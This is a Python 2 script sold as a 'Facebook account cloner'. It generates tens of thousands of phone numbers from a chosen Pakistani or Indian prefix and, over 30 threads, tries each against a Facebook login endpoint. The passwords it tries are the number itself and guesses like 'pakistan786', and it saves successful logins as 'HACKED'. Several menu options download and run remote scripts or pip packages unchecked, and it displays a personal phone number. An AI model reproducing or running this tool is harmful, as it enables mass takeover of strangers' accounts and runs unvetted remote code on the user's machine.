import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
    os.system('clear')

logo = "\n\x1b[3;90m SOMI NAM HE KAFI HA  FACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI BRAND\x1b[0;37;40m\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;92mDEVOLPER       : SOMI AWAN\n\x1b[3;92m\xe2\x96\xb8 \x1b[3;93mWHATSAPP NO   : +923455453538\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;94mNOTE    : PLZ DON,T CALL ME ONLY TEXT\n\x1b[3;93m\xe2\x96\xb8 \x1b[1;95mNOTE     : USE FAST 4G SIM NET\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    lodhirt()
    print
    print '       \x1b[4;96mACCOUNT INFO\x1b[0;37;40m            \x1b[4;94m SΩMI BRAND  \x1b[0;37;40m'
    print
    jaalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;93mPAK 6 DIGIT CLONE')
    jaalan('\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]  \x1b[1;93mINDIAN 7 DIGIT COMMING SOON')
    print
    print
    print
    jalan('    \x1b[1;91m[\x1b[1;93m20\x1b[1;91m] \x1b[1;92mINDIAN COMMING SOON \x1b[1;91m[\x1b[1;93m21\x1b[1;91m] \x1b[1;92mFOLLOW \x1b[1;91m[\x1b[1;93m22\x1b[1;91m] \x1b[1;92mCONTACT \x1b[1;91m[\x1b[1;93m00\x1b[1;91m] \x1b[1;92mEXIT')
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 0300 TO 0349  :  ')
            k = '+03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade Somii')
        os.system('clear')
        print
        psb('7 DIGIT INDIAN CRACKER UPDATED SUCCESSFULLY')
        os.system('clear')
        os.system('Somii')
        menu()
    elif bch == '3':
        tik()
        os.system('clear')
        if not os.path.isfile('.report.py'):
            jalan('DONT USE FACEBOOK AUTO REPORT. ONLY TIME WASTE. SO I RECOMMEND YOU TO DONT USE IT. BUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
            time.sleep(1)
            os.system('wget https://github.com/Somi190/somii/master/.Somii.py')
            os.system('clear')
            os.system('python2 .Somii.py')
        else:
            os.system('python2 .Somii.py')
            time.sleep(0.001)
            raw_input('\n[\x1b[1;96mPRESS ENTER TO EXIT]')
            exb()
    elif bch == '4':
        tik()
        os.system('clear')
        if not os.path.isfile('.bspeed.py'):
            os.system('wget https://raw.githubusercontent.com/BotolBaba0/BotolBaba0.github.io/master/.Somii.py')
            os.system('python2 .bspeed.py')
        else:
            os.system('python2 .bspeed.py')
            time.sleep(0.01)
            raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
            os.system('python2 .README.md')
            exb()
    elif bch == '5':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '6':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '7':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '8':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '9':
        tik()
        os.system('clear')
        if not os.path.isfile('password.txt'):
            os.system('wget https://raw.githubusercontent.com/Somi190/Somi190.github.io/master/password.txt')
            if not os.path.isfile('.bt.py'):
                os.system('wget https://raw.githubusercontent.com/Somi190/Somi190.github.io/master/.somiii.py')
                os.system('python2 .somiii.py')
            else:
                os.system('python2 .somiii.py')
                time.sleep(0.01)
                raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
                os.system('python2 .README.md')
                exb()
    elif bch == '11':
        os.system('xdg-open https://m.youtube.com/watch?v=FTPrPVqE56I')
        time.sleep(1)
        menu()
    elif bch == '12':
        os.system('xdg-open https://youtu.be/McahDH7uuV8')
        time.sleep(1)
        menu()
    elif bch == '13':
        os.system('xdg-open https://bit.do/botoleightdigit')
        time.sleep(1)
        menu()
    elif bch == '14':
        os.system('xdg-open https://bit.do/botolninedigit')
        time.sleep(1)
        menu()
    elif bch == '15':
        os.system('xdg-open https://m.youtube.com/watch?v=KAwRF2M9syw')
        time.sleep(1)
        menu()
    elif bch == '16':
        os.system('xdg-open https://youtu.be/QGdi1ZzG1sY')
        time.sleep(1)
        menu()
    elif bch == '17':
        os.system('xdg-open https://youtu.be/6uZTO1DaGXU')
        time.sleep(1)
        menu()
    elif bch == '18':
        os.system('xdg-open https://youtu.be/bjCzrgzq9yM')
        time.sleep(1)
        menu()
    elif bch == '20':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade bababindsix')
        os.system('clear')
        print logo
        print
        psb(' Tool has been successfully updated')
        time.sleep(1)
        os.system('python2 .README.md')
        menu()
    elif bch == '21':
        os.system('xdg-open https://facebook.com/somi awan2')
        time.sleep(1)
        menu()
    elif bch == '22':
        os.system('xdg-open https://www.facebook.com/somi awan098048450')
        time.sleep(1)
        menu()
    elif bch == '00':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] PLEASE WAIT, PROCESS IS START ...')
    time.sleep(0.5)
    psb('[!] TO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47* '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'pakistan786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'pak786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                            pass5 = 'Rahul123'
            
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()